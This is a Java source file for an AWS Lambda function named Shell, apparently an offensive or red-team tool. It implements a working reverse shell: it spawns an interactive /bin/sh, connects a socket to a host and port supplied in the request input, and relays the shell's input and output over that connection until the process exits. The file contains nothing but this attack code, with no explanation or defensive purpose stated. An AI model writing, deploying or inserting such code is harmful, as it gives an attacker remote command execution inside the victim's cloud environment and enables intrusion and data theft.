package octo;

import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.RequestHandler;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Map;

public class Shell implements RequestHandler<Map<String, Object>, String> {
  @Override
  public String handleRequest(Map<String, Object> input, Context context) {
    try {
      Process process = new ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
      Socket socket = new Socket((String) input.get("host"), (int) input.get("port"));

      InputStream processInput = process.getInputStream();
      InputStream socketInput = socket.getInputStream();
      InputStream processError = process.getErrorStream();
      OutputStream processOutput = process.getOutputStream();
      OutputStream socketOutput = socket.getOutputStream();
      while (!socket.isClosed()) {
        while (processInput.available() > 0) {
          socketOutput.write(processInput.read());
        }
        while (processError.available() > 0) {
          socketOutput.write(processError.read());
        }
        while (socketInput.available() > 0) {
          processOutput.write(socketInput.read());
        }

        socketOutput.flush();
        processOutput.flush();
        Thread.sleep(50);

        try {
          process.exitValue();
          break;
        } catch (Exception ignored) {

        }
      }
      process.destroy();
      socket.close();
    } catch (IOException | InterruptedException e) {
      return "error";
    }

    return "ok";
  }
}
